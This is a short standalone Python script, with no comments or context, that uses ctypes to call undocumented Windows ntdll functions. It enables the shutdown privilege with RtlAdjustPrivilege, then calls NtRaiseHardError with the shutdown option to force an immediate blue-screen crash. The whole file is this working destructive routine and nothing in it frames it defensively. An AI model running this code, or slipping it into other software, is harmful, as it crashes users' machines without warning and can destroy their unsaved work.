import ctypes
ntdll = ctypes.windll.ntdll
ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
